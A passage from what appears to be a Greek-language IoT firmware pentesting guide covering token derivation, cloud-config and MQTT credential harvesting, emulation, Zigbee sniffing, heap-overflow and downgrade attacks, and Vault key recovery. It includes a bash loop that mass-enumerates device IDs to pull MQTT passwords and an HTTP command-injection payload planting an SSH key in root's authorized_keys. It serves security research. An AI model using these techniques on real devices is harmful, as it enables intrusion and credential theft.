- Φόρτωσε τα binaries στο Ghidra/radare2 και αναζήτησε τη διαδρομή config ("/pf/") ή τη χρήση του MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράγαγε το token στο Bash και μετέτρεψε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλογή cloud config και διαπιστευτηρίων MQTT

- Συνθέστε το URL και λάβετε το JSON με curl· αναλύστε το με jq για να εξαγάγετε secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Κατάχρηση MQTT σε plaintext και αδύναμων ACL για topics (αν υπάρχουν)

- Χρησιμοποιήστε τα credentials που ανακτήθηκαν για να κάνετε subscribe σε maintenance topics και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του vendor, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να επαναλάβετε υποψήφια IDs, να παράγετε tokens και να ανακτάτε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική enumeration.
- Προτιμήστε την εξομοίωση ή τη στατική ανάλυση για την ανάκτηση secrets, χωρίς να τροποποιείτε το hardware-στόχο, όταν αυτό είναι εφικτό.


Η διαδικασία εξομοίωσης firmware επιτρέπει τη **δυναμική ανάλυση** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση ενδέχεται να αντιμετωπίσει προκλήσεις που σχετίζονται με εξαρτήσεις από το hardware ή την αρχιτεκτονική. Ωστόσο, η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και σειρά byte, όπως ένα Raspberry Pi, ή σε μια προδιαμορφωμένη εικονική μηχανή μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε τη σειρά byte και την αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για την εξομοίωση ενός binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Πλήρης εξομοίωση συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystems για εξομοίωση

Αν ένα SquashFS superblock είναι αναγνώσιμο, αλλά οι μετατοπίσεις των inode, directory ή fragment tables είναι αδύνατες, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering του binary της πρώιμης εκκίνησης και αναπαραγάγετε το γράφημα block devices που δημιουργεί: τα ενσωματωμένα συστήματα μπορεί να εκθέτουν ένα ονομαστικό root partition, αλλά να κατασκευάζουν το πραγματικό filesystem με αντιστοίχιση `dm-linear` που προσθέτει sectors δανεισμένα από άλλο partition. Οι έλεγχοι μόνο του superblock μπορεί να πετύχουν, ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λάθος θέση.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς τους αριθμητικούς υπολογισμούς του firmware. Συγκεκριμένα, προσδιορίστε αν τα μήκη εκφράζονται σε bytes, sectors των 512 byte ή pages των 4 KiB· αναπαραγάγετε τις μετατοπίσεις bit και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές τέλους που εξαρτώνται από το bank σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα αποκόπτει το μέγεθος σε όριο 4 KiB και έπειτα εκφράζει το αποτέλεσμα σε sectors των 512 byte· η αντικατάστασή του με `partition_bytes // 512` μπορεί να μετακινήσει την προστιθέμενη περιοχή κατά μερικά kilobytes και να αλλοιώσει όλους τους επόμενους πίνακες SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη ροή εργασίας επικύρωσης είναι η εξής:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το binary του verifier/init τη συσκευή προέλευσης, το sector εκκίνησης και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις περιοχές χωρίς να αλλάξετε τη σημασιολογία ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό εύρος γύρω από το προβλεπόμενο όριο και απαιτήστε αρκετές διαδοχικές έγκυρες δομές metadata, αντί να αποδεχτείτε μόνο ένα εύλογο superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής διάσχιση όλων των directories και fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση dm-verity ελεγχόμενη από τον αναλυτή

Όταν ο αναλυτής ελέγχει τον kernel, το initramfs και τους virtual disks του QEMU, μπορεί να εκκινηθεί ένα τροποποιημένο root αντικαθιστώντας το PID 1 του vendor που κάνει verification με ένα μικρό, statically linked init. Πρόκειται για **αντικατάσταση της αλυσίδας εκκίνησης σε εργαστήριο**, όχι για παραβίαση του dm-verity, της RSA signature του, του Secure Boot ή ενός κλειδιού που έχει δεσμευτεί σε TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης θα πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδικασίας εκκίνησης: να κάνει mount το `devtmpfs`, να καλέσει τη `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να κάνει mount τα `/proc` και `/sys`, να περιμένει τη διαθέσιμη block device, να κάνει mount το τροποποιημένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να καλέσει `execve()` για το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποφεύγει την κατά λάθος αποσύνδεση mount points που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε την κατάσταση των συσκευών που μεταβάλλεται ξεχωριστά από το τροποποιημένο immutable root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος, μόνο για ανάγνωση, virtio disk παρέχει το τροποποιημένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης image εκτός σύνδεσης

Εξετάστε την επίμονη κατάσταση εκτός του guest όταν οι αργές εκκινήσεις, τα καταστροφικά startup scripts ή η αναξιόπιστη καταγραφή στην κονσόλα δυσκολεύουν τον εντοπισμό της αποτυχίας. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιεί μια εκτελούμενη VM· εκθέστε το με `qemu-nbd`, περιορίστε τον εντοπισμό του LVM στο προβλεπόμενο partition του NBD και απενεργοποιήστε το volume group πριν αποσυνδέσετε το NBD.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράφετε αρχεία-δείκτες με χρονικές σημάνσεις σε έναν σταθερό, εγγράψιμο τόμο και επαληθεύετέ τα offline· τα `/dev/kmsg`, FIFOs και οι παροδικές κονσόλες μπορούν να οδηγήσουν σε ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ επιπέδων πριν αλλάξετε άσχετο κώδικα: `uname -r` έναντι του `/lib/modules/`, τα χαρακτηριστικά του ext4 στον δίσκο έναντι της διαμόρφωσης του kernel, καθώς και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτώνεται επιτυχώς μέσω `dlopen()`, αλλά να παραμένει μη αξιοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

### Αντιστοίχιση μηνυμάτων Zigbee / ραδιοσυνεπεξεργαστή

Στους IoT hubs, το RF stack συχνά είναι χωρισμένο ανάμεσα σε ένα **radio MCU** και μια διεργασία userland του Linux. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **parser στην πλευρά του controller** στο radio MCU
3. **πρωτόκολλο κειμένου ή TLV μέσω serial/UART** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στο κύριο daemon
5. **handler / state machine ειδικό για το πρωτόκολλο**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα δυαδικά radio frames σε ένα πρωτόκολλο κειμένου, όπως `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τις **ομάδες μηνυμάτων** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέρχονται από το **δίκτυο** και ποια από τον ίδιο τον controller
- Τα ακριβή **πεδία διάκρισης ειδικά για τον κατασκευαστή** (για παράδειγμα, το Zigbee `manufacturer_code` και το προσαρμοσμένο `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά το **commissioning**, την ανακάλυψη ή τις φάσεις λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει αυτό, η υποκλοπή της κίνησης commissioning ενδέχεται να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημειώστε αν η συσκευή που δοκιμάζετε τους επιβάλλει πράγματι.

### Handlers πρωτοκόλλου ειδικοί για τον κατασκευαστή και προσβασιμότητα που ελέγχεται από FSM

Οι εντολές Zigbee/ZCL ειδικές για τον κατασκευαστή είναι συχνά καλύτερος στόχος από τα τυποποιημένα clusters, επειδή τροφοδοτούν **προσαρμοσμένο κώδικα parsing** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον command dispatcher μέχρι να εντοπίσετε τον **handler μόνο για τον κατασκευαστή**.
- Ανακτήστε τους πίνακες **κατάστασης FSM**, **event**, **check**, **action** και **επόμενης κατάστασης**.
- Εντοπίστε τις **μεταβατικές καταστάσεις** που προχωρούν αυτόματα, καθώς και τα branches retry/error που τελικά κάνουν reset ή απελευθερώνουν κατάσταση ελεγχόμενη από τον επιτιθέμενο.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει το daemon στην ευάλωτη κατάσταση, αντί να υποθέσετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, το packet replay από ένα Python framework μπορεί να είναι υπερβολικά αργό. Μια πιο αξιόπιστη προσέγγιση είναι η εξομοίωση μιας νόμιμης συσκευής σε πραγματικό hardware (για παράδειγμα, ένα **nRF52840**) με stack επαγγελματικού επιπέδου, ώστε να μπορείτε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον σωστό χρονισμό commissioning.

### Κατηγορία bug σε fragmented downloads σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία bug σε firmware εμφανίζεται σε fragmented downloads blob/model/configuration:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο πεδία του packet που ελέγχονται από τον επιτιθέμενο, όπως το `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς να ελέγχει αν υπερβαίνει το **αρχικό μέγεθος της εκχώρησης μνήμης**.

Αυτό επιτρέπει σε έναν επιτιθέμενο να στείλει:

- Ένα έγκυρο πρώτο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να προκαλέσει μικρή εκχώρηση heap.
- Ένα επόμενο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο μέγεθος packet που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να υπερχειλίζει το αρχικά δεσμευμένο buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **εξομοίωση συσκευής**, ώστε ο στόχος να περάσει στην αναμενόμενη κατάσταση λήψης model ή blob πριν από την αποστολή των κακοσχηματισμένων fragments.

### Triggers `free()` μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος πρόκλησης εκμετάλλευσης μεταδεδομένων heap συχνά δεν είναι να «περιμένετε τον καθαρισμό», αλλά να **προκαλέσετε τον χειρισμό σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε το FSM σε καταστάσεις **retry** ή **error**.
- Υπερβείτε το όριο επαναλήψεων, ώστε το daemon να κάνει **reset στο context** και να απελευθερώσει το αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε primitives από την πλευρά του allocator, πριν η διεργασία καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση των μεταδεδομένων chunk μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **πεδίου size**, ώστε να ανακατευθυνθεί η περιήγηση του allocator σε **πλαστά chunks τοποθετημένα μέσα στο buffer που υπερχειλίστηκε**, αντί να καταστραφούν αμέσως πραγματικοί δείκτες bin και να καταρρεύσει η διεργασία.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλότερου επιπέδου. Οι runtime προστασίες για binary σε embedded συστήματα είναι σπάνιες, αλλά όταν υπάρχουν, ενδέχεται να χρειάζονται τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις εκμετάλλευσης fastbin του uClibc (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Μια μεταγενέστερη μεγάλη εκχώρηση μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε πλαστό chunk πρέπει να περνά τους ελέγχους (εύλογο size, `fd = 0` και τα γειτονικά chunks να θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Binaries χωρίς PIE υπό ASLR:** αν το ASLR είναι ενεργοποιημένο, αλλά το κύριο binary είναι **χωρίς PIE**, οι διευθύνσεις `.data/.bss` μέσα στο binary παραμένουν σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια εκχώρηση fastbin να καταλήξει σε έναν **πίνακα function pointers**.
- **NUL που σταματά τον parser:** κατά το parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας παράλληλα τα επόμενα bytes που ελέγχονται από τον επιτιθέμενο για ένα stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταφέρει εκεί την εκτέλεση.

## Επιθέσεις υποβάθμισης firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη και όταν ένας κατασκευαστής υλοποιεί ελέγχους κρυπτογραφικών υπογραφών για εικόνες firmware, συχνά παραλείπεται η **προστασία από επαναφορά έκδοσης (υποβάθμιση)**. Όταν ο boot loader ή ο recovery loader επαληθεύει μόνο την υπογραφή με ένα ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν μονοτονικό μετρητή) της εικόνας που εγκαθίσταται, ένας επιτιθέμενος μπορεί να εγκαταστήσει νόμιμα ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει ευπάθειες για τις οποίες είχε εκδοθεί διόρθωση.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε μια παλαιότερη υπογεγραμμένη εικόνα**
   * Κατεβάστε την από τη δημόσια πύλη λήψεων του κατασκευαστή, CDN ή ιστότοπο υποστήριξης.
   * Εξαγάγετέ την από συνοδευτικές εφαρμογές για κινητά/desktop (π.χ. από τον φάκελο `assets/firmware/` μέσα σε ένα Android APK).
   * Ανακτήστε την από αποθετήρια τρίτων, όπως τα VirusTotal, Internet archives, forums κ.λπ.
2. **Ανεβάστε ή διαθέστε την εικόνα στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού ενημέρωσης:
   * Web UI, API εφαρμογής κινητού, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν endpoints HTTP(S) χωρίς authentication, τα οποία δέχονται blobs firmware κωδικοποιημένα σε Base64, τα αποκωδικοποιούν από την πλευρά του server και ενεργοποιούν recovery/upgrade.
3. Μετά την υποβάθμιση, εκμεταλλευτείτε μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά την πιο πρόσφατη εικόνα ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από υποβάθμιση

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς απολύμανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ, για την ενεργοποίηση πρόσβασης root μέσω SSH key). Οι νεότερες εκδόσεις firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από downgrade καθιστά τη διόρθωση ανώφελη.<sup>[[4]](#references)</sup>

### Εξαγωγή Firmware από Mobile Apps

Πολλοί κατασκευαστές ενσωματώνουν πλήρεις εικόνες firmware στις συνοδευτικές mobile εφαρμογές τους, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα συνήθως αποθηκεύονται χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. ### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς με υποδοχές A/B

Ορισμένοι κατασκευαστές υλοποιούν πράγματι έναν **ratchet** κατά της υποβάθμισης, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, μια εντολή recovery ή έναν OTA agent σε userspace). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα κατατμήσεων ή τα μεταδεδομένα της υποδοχής, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα μεταδεδομένα του firmware περιέχουν τόσο έναν περιγραφέα έκδοσης όσο και έναν **security ratchet** / μονοτονικό μετρητή.
- Ο updater συγκρίνει το ratchet του image με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα υπογεγραμμένα images.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο την κεφαλίδα, το CRC και την υπογραφή πριν εκκινήσει την επιλεγμένη υποδοχή.
- Η ενεργοποίηση της υποδοχής αποθηκεύεται ξεχωριστά, σε πίνακα κατατμήσεων ή σε μετρητή γενιάς ανά υποδοχή, και **δεν συνδέεται κρυπτογραφικά** με το ακριβές digest του firmware που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **επικύρωσης ενός image / εκκίνησης άλλου image** σε συστήματα με διπλές υποδοχές. Αν ο επιτιθέμενος μπορεί να κάνει τον updater να ορίσει την υποδοχή B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας ένα τρέχον υπογεγραμμένο image και στη συνέχεια να αντικαταστήσει την υποδοχή B πριν από την επανεκκίνηση, ο bootloader μπορεί και πάλι να εκκινήσει το υποβαθμισμένο image, επειδή εμπιστεύεται μόνο τα ήδη οριστικοποιημένα μεταδεδομένα της υποδοχής.

Συνηθισμένο μοτίβο κατάχρησης:

1. Μεταφόρτωση ενός **τρέχοντος υπογεγραμμένου** firmware στην ανενεργή υποδοχή και εκτέλεση της κανονικής ρουτίνας επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτή την υποδοχή ως την επόμενη ενεργή.
2. **Μην κάνετε ακόμη επανεκκίνηση**. Επανεισέλθετε στη ρουτίνα προετοιμασίας/διαγραφής της υποδοχής στην ίδια συνεδρία.
3. Εκμετάλλευση παρωχημένης κατάστασης εκκίνησης ή λογικής επιλογής υποδοχής, ώστε ο updater να διαγράψει την **ίδια φυσική υποδοχή** που μόλις προήγαγε.
4. Εγγραφή ενός **παλαιότερου αλλά ακόμη υπογεγραμμένου** firmware σε αυτή την υποδοχή.
5. Παράλειψη της ρουτίνας επικύρωσης που επιβάλλει το ratchet και άμεση επανεκκίνηση.
6. Ο bootloader επιλέγει την προαχθείσα υποδοχή, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Τι να αναζητήσετε κατά την αντίστροφη ανάλυση υλοποιήσεων ενημέρωσης A/B:

- Επιλογή υποδοχής που προκύπτει από **σημαίες κατά την εκκίνηση**, οι οποίες δεν ανανεώνονται μετά από επιτυχή εναλλαγή.
- Ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει μια υποδοχή βάσει παρωχημένης κατάστασης, αντί για την **τρέχουσα οριστικοποιημένη διάταξη**.
- Συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **μετρητή γενιάς** / σημαία ενεργής υποδοχής και δεν αποθηκεύει το hash του επικυρωμένου image.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** σε στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν την υποδοχή σημειωμένη ως εκκινήσιμη, ακόμη κι αφού το περιεχόμενό της διαγραφεί και επανεγγραφεί.

### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Προστατεύονται επαρκώς η μεταφορά και η αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **μονοτονικό μετρητή anti-rollback** πριν από το flashing;
* Επαληθεύεται το image μέσα σε αλυσίδα secure boot (π.χ. οι υπογραφές ελέγχονται από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Συνδέονται τα μεταδεδομένα ενεργοποίησης της υποδοχής **με το digest/την έκδοση του επικυρωμένου firmware** ή μπορεί να τροποποιηθεί μια υποδοχή μετά την προαγωγή της;
* Μετά την επιτυχή εναλλαγή υποδοχής, αναγκάζεται η συσκευή να επανεκκινηθεί ή παραμένουν προσβάσιμες στην ίδια συνεδρία μεταγενέστερες ρουτίνες ενημέρωσης/διαγραφής;
* Εκτελεί ο κώδικας userland πρόσθετους ελέγχους λογικής (π.χ. επιτρεπόμενο χάρτη κατατμήσεων, αριθμό μοντέλου);
* Χρησιμοποιούν οι *μερικές* ή οι *εφεδρικές* ροές ενημέρωσης την ίδια λογική επικύρωσης;

> 💡  Αν λείπει κάποιο από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν ένα image ενημέρωσης συνδυάζει μικρά μεταδεδομένα σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάντε πρώτα διαλογή του container πριν δοκιμάσετε brute force:<sup>[[1]](#references)</sup>

- Εξαγάγετε κεφαλίδες, offsets και όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει τυχαίο password/key συνεδρίας του firmware.
- Το αποσπασμένο υλικό PGP στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέτετε ότι χρησιμοποιείται για την εμπιστευτικότητα.

Αν η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP) αποτύχει, αναλύστε την **πραγματική διαδρομή αποκρυπτογράφησης** αντί να ψάχνετε μόνο για ιδιωτικά κλειδιά:

- Αποσυμπιλίστε τον updater / το binary διαχείρισης και εντοπίστε ποιος διαβάζει το κρυπτογραφημένο blob, ποιος helper/API το αποκρυπτογραφεί και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγμένο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και αρχεία unit και scripts αρχικοποίησης.
- Αντιμετωπίστε plaintext εντολές `vault operator unseal ...`, recovery keys, bootstrap tokens ή τοπικά scripts αυτόματου unseal του KMS ως ισοδύναμα με υλικό ιδιωτικού κλειδιού.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το backend αποθήκευσης, η αναπαραγωγή εκείνου του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
